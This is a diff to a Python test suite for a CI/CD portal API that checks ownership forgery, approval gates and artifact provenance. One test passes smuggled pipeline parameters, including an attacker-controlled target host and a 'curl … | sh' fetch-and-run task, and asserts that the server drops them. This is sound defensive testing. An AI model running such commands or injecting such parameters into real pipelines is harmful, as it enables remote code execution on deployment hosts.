@@ -5,6 +5,7 @@ from app.main import app
 
 
 client = TestClient(app)
+MACHINE_HEADERS = {'Authorization': 'Bearer netci-local-pipeline-key'}
 
 
 def setup_function():
@@ -41,7 +42,19 @@ def test_portal_system_detail_and_module_overview_are_hierarchical():
     overview = client.get('/modules/hello-container/overview')
     assert overview.status_code == 200
     assert overview.json()['module']['name'] == 'Hello Container'
-    assert overview.json()['trends']['securityFindings']['critical'] == 0
+    assert overview.json()['mergeRequests'] == []
+    assert overview.json()['trends']['securityFindings'] is None
+
+
+def test_module_general_settings_are_persisted_by_the_api():
+    updated = client.patch('/modules/hello-container', json={
+        'displayName': 'Container Service',
+        'moduleType': 'Backend',
+        'description': 'Updated through the live settings endpoint',
+    })
+
+    assert updated.status_code == 200
+    assert client.get('/modules/hello-container').json()['name'] == 'Container Service'
 
 
 def test_portal_can_create_system_and_attach_a_delivery_application_as_module():
@@ -49,7 +62,6 @@ def test_portal_can_create_system_and_attach_a_delivery_application_as_module():
         'id': 'billing-platform',
         'unit': 'Technology Platform Center',
         'description': 'Billing delivery system',
-        'owner': 'Admin',
     })
     assert created_system.status_code == 201
 
@@ -97,6 +109,29 @@ def test_portal_can_create_system_and_attach_a_delivery_application_as_module():
     assert application['stages'] == ['checkout', 'unit-test', 'build', 'publish']
 
 
+def test_system_owner_cannot_be_forged_in_the_request_body():
+    response = client.post('/systems', json={
+        'id': 'forged-owner-system',
+        'unit': 'Technology Platform Center',
+        'description': 'The verified caller must own this record',
+        'owner': 'someone-else',
+    })
+
+    assert response.status_code == 422
+    assert response.json()['code'] == 'VALIDATION_ERROR'
+
+
+def test_production_requester_cannot_be_forged_in_the_request_body():
+    response = client.post('/production-requests', json={
+        'requestedBy': 'someone-else',
+        'scheduledFor': '2030-08-30T03:00:00+07:00',
+        'modules': [{'moduleId': 'hello-container', 'version': 'v1.0.0', 'deploymentOrder': 1}],
+    })
+
+    assert response.status_code == 422
+    assert response.json()['code'] == 'VALIDATION_ERROR'
+
+
 def test_invalid_system_does_not_provision_an_orphan_delivery_application():
     before = len(main.platform.list_applications())
 
@@ -128,7 +163,6 @@ def test_module_environment_contract_rejects_mixed_runtime_and_incomplete_target
         'id': 'validation-system',
         'unit': 'Technology Platform Center',
         'description': 'Target validation system',
-        'owner': 'Admin',
     })
     assert created_system.status_code == 201
 
@@ -232,23 +266,62 @@ def test_reference_module_is_provisioned_and_can_trigger_the_demo_pipeline():
         'commitSha': 'a1c4e2f',
         'branch': 'main',
         'environment': 'dev',
-        'parameters': {'portalPipeline': 'ci'},
+        'parameters': {
+            'portalPipeline': 'ci',
+            'target_hosts': ['attacker-controlled-host'],
+            'deployment_tasks': ['curl https://unreviewed.example/script | sh'],
+            'task_settings': {'healthCheck': {'script': 'exit 0'}},
+        },
     })
 
     assert triggered.status_code == 202
     assert triggered.json()['status'] == 'queued'
     assert triggered.json()['applicationId'] == client.get('/modules/hello-container').json()['applicationId']
-    assert triggered.json()['parameters'] == {'portalPipeline': 'ci'}
+    assert triggered.json()['parameters']['portalPipeline'] == 'ci'
+    assert triggered.json()['parameters']['target_hosts'] == ['localhost']
+    assert triggered.json()['parameters']['target_environment'] == 'dev'
+    assert triggered.json()['parameters']['deployment_tasks'] == []
+    assert triggered.json()['parameters']['task_settings'] == {}
 
 
-def test_production_requests_are_queryable_and_approval_is_a_portal_command():
+def test_production_request_requires_a_server_owned_production_target():
+    created = client.post('/systems/hello-container/modules', json={
+        'name': 'dev-only-api',
+        'repositoryUrl': 'https://github.com/example/dev-only-api',
+        'pipelineTemplate': 'container-ci-cd-v1',
+        'runtime': 'docker',
+        'defaultEnvironment': 'dev',
+        'deploymentEnvironments': [{
+            'displayName': 'Development',
+            'environment': 'dev',
+            'runtime': 'docker',
+            'servers': ['dev-api-01'],
+        }],
+    })
+    assert created.status_code == 201
+    assert client.post('/modules/dev-only-api/versions', json={
+        'tag': 'v1.0.0',
+        'gitTagUrl': 'https://github.com/example/dev-only-api/tags/v1.0.0',
+        'artifactUrl': 'https://registry.example/dev-only-api:v1.0.0',
+    }).status_code == 201
+
+    response = client.post('/production-requests', json={
+        'scheduledFor': '2030-08-30T03:00:00+07:00',
+        'modules': [{'moduleId': 'dev-only-api', 'version': 'v1.0.0', 'deploymentOrder': 1}],
+    })
+
+    assert response.status_code == 409
+    assert response.json()['code'] == 'DEPLOYMENT_TARGET_NOT_CONFIGURED'
+
+
+def test_production_request_refuses_a_version_without_verified_artifact_provenance():
     client.post('/modules/hello-container/versions', json={
         'tag': 'v1.0.0',
         'gitTagUrl': 'https://github.com/example/hello-container/tags/v1.0.0',
         'artifactUrl': 'https://github.com/example/hello-container/releases/v1.0.0',
     })
     req = client.post('/production-requests', headers={'Idempotency-Key': 'prod-request-test'}, json={
-        'scheduledFor': '2026-08-30T03:00:00+07:00',
+        'scheduledFor': '2030-08-30T03:00:00+07:00',
         'rollbackStrategy': 'automatic',
         'runAutomationTests': True,
         'modules': [{'moduleId': 'hello-container', 'version': 'v1.0.0', 'deploymentOrder': 1}],
@@ -258,14 +331,84 @@ def test_production_requests_are_queryable_and_approval_is_a_portal_command():
 
     approved = client.post(
         f'/production-requests/{request_id}/approve',
-        json={'actor': 'mentor-reviewer', 'comment': 'approved for demo'},
+        json={'comment': 'approved for demo'},
     )
+    assert approved.status_code == 409
+    assert approved.json()['code'] == 'VERSION_NOT_PROMOTABLE'
+
+
+def test_production_approval_enforces_the_requested_automation_gate():
+    digest = f"sha256:{'e' * 64}"
+    run = client.post('/modules/hello-container/pipeline-runs', json={
+        'commitSha': 'abc1234',
+        'environment': 'staging',
+    }).json()
+    assert client.post(
+        f"/pipeline-runs/{run['id']}/ci-result",
+        headers=MACHINE_HEADERS,
+        json={'status': 'running'},
+    ).status_code == 202
+    assert client.post(
+        f"/pipeline-runs/{run['id']}/security-evidence",
+        headers=MACHINE_HEADERS,
+        json={
+            'artifactDigest': digest,
+            'artifactRef': f'localhost:5000/hello-container@{digest}',
+            'sbom': {'generatedBy': 'syft', 'location': 's3://evidence/sbom.json', 'format': 'cyclonedx-json'},
+            'vulnerabilityScan': {'scanner': 'trivy', 'status': 'passed', 'critical': 0, 'high': 0, 'medium': 0},
+            'signature': {'provider': 'cosign', 'verified': True, 'certificateIdentity': 'netci-local'},
+        },
+    ).status_code == 202
+    completed = client.post(
+        f"/pipeline-runs/{run['id']}/ci-result",
+        headers=MACHINE_HEADERS,
+        json={'status': 'succeeded', 'artifactDigest': digest},
+    ).json()
+    client.post(
+        f"/deployments/{completed['deployment']['id']}/result",
+        headers=MACHINE_HEADERS,
+        json={'status': 'healthy'},
+    )
+    assert client.post('/modules/hello-container/versions', json={
+        'tag': 'v8.0.0',
+        'gitTagUrl': 'https://github.com/example/hello-container/tags/v8.0.0',
+        'artifactUrl': 'https://registry.example/hello-container@' + digest,
+        'pipelineRunId': run['id'],
+        'artifactDigest': digest,
+    }).status_code == 201
+    request = client.post('/production-requests', json={
+        'scheduledFor': '2030-08-30T03:00:00+07:00',
+        'rollbackStrategy': 'automatic',
+        'runAutomationTests': True,
+        'modules': [{'moduleId': 'hello-container', 'version': 'v8.0.0', 'deploymentOrder': 1}],
+    }).json()
+
+    blocked = client.post(f"/production-requests/{request['id']}/approve", json={})
+    assert blocked.status_code == 409
+    assert blocked.json()['code'] == 'AUTOMATION_GATE_FAILED'
+
+    assert client.post(
+        '/modules/hello-container/versions/v8.0.0/ci-report',
+        headers=MACHINE_HEADERS,
+        json={
+            'coverage': 90,
+            'autoTest': 'passed',
+            'sast': 'passed',
+            'sastIssues': 0,
+            'vulnerabilities': {'critical': 0, 'high': 0, 'medium': 0},
+            'commit': 'abc1234',
+        },
+    ).status_code == 202
+    approved = client.post(f"/production-requests/{request['id']}/approve", json={})
     assert approved.status_code == 202
-    assert approved.json()['status'] == 'approved'
-    assert approved.json()['comment'] == 'approved for demo'
+    deployment = client.get(f"/deployments/{approved.json()['deploymentId']}").json()
+    production_run = client.get(f"/pipeline-runs/{deployment['pipelineRunId']}").json()
+    assert production_run['parameters']['target_environment'] == 'prod'
+    assert production_run['parameters']['target_hosts'] == ['srv-hello-container-prod']
+    assert production_run['parameters']['sourcePipelineRunId'] == run['id']
 
 
-def test_portal_can_create_a_scheduled_multi_module_production_request():
+def test_portal_refuses_multi_module_request_until_ordered_coordinator_exists():
     client.post('/modules/hello-container/versions', json={
         'tag': 'v1.0.0',
         'gitTagUrl': 'https://github.com/example/hello-container/tags/v1.0.0',
@@ -286,18 +429,7 @@ def test_portal_can_create_a_scheduled_multi_module_production_request():
         ],
     })
 
-    assert response.status_code == 201
-    body = response.json()
-    assert body['status'] == 'waiting_approval'
-    assert body['requestedBy'] == 'anonymous'
-    assert body['scheduledFor'] == '2026-08-30T03:00:00+07:00'
-    assert body['rollbackStrategy'] == 'automatic'
-    assert body['runAutomationTests'] is True
-    assert body['modules'] == [
-        {'moduleId': 'hello-container', 'moduleName': 'Hello Container', 'version': 'v1.0.0', 'deploymentOrder': 1},
-        {'moduleId': 'hello-kubernetes', 'moduleName': 'Hello Kubernetes', 'version': 'v1.0.0', 'deploymentOrder': 2},
-    ]
-    assert any(item['id'] == body['id'] for item in client.get('/production-requests').json())
+    assert response.status_code == 422
 
 
 def test_production_request_creation_is_idempotent_for_the_same_key():
@@ -307,7 +439,6 @@ def test_production_request_creation_is_idempotent_for_the_same_key():
         'artifactUrl': 'https://github.com/example/hello-container/releases/v1.0.0',
     })
     payload = {
-        'requestedBy': 'Admin',
         'scheduledFor': '2026-08-30T03:00:00+07:00',
         'rollbackStrategy': 'automatic',
         'runAutomationTests': True,
@@ -334,7 +465,6 @@ def test_portal_write_fails_closed_when_configured_persistence_is_unavailable(mo
         'id': 'persistence-check',
         'unit': 'Technology Platform Center',
         'description': 'Must not survive a failed write',
-        'owner': 'Admin',
     })
 
     assert response.status_code == 503
@@ -366,30 +496,38 @@ def test_portal_persistence_bootstrap_failure_is_visible_in_health(monkeypatch):
 def test_portal_returns_servers_and_scoped_audit_events():
     servers = client.get('/servers')
     assert servers.status_code == 200
-    assert {'localhost', 'jenkins-local', 'kind-local'} <= {item['id'] for item in servers.json()}
+    assert servers.json()
+    assert all(item['kind'] == 'configured-runtime-target' for item in servers.json())
+    assert all(item['status'] == 'unknown' for item in servers.json())
 
     audit = client.get('/audit-events?moduleId=hello-container')
     assert audit.status_code == 200
     assert all(item['target'] == 'hello-container' for item in audit.json())
+    assert all(item['actor'] != 'operator' for item in audit.json())
 
 
 def test_dcim_lookup_exposes_system_modules_and_deployment_targets():
     services = client.get('/dcim/services?query=hello')
     assert services.status_code == 200
-    assert services.json()['items'][0]['code'] == 'VTN_HELLO-CONTAINER'
+    assert services.json() == {'source': 'dcim', 'status': 'not_configured', 'items': []}
 
     created = client.post('/systems', json={
         'id': 'eOffice',
         'unit': 'Digital Office',
         'description': 'Enterprise office',
-        'owner': 'Admin',
     })
     assert created.status_code == 201
     assert client.get('/systems/eOffice').json()['moduleCount'] == 0
 
     modules = client.get('/dcim/modules?systemId=hello-container')
     assert modules.status_code == 200
-    assert {'hello-container'} <= {item['id'] for item in modules.json()['items']}
+    assert modules.json()['status'] == 'not_configured'
+    assert modules.json()['items'] == []
+
+    dcim_servers = client.get('/dcim/servers?systemId=hello-container&moduleId=hello-container')
+    assert dcim_servers.status_code == 200
+    assert dcim_servers.json()['status'] == 'not_configured'
+    assert dcim_servers.json()['items'] == []
 
     servers = client.get('/servers')
     assert any(item['hostname'] == 'localhost' for item in servers.json())
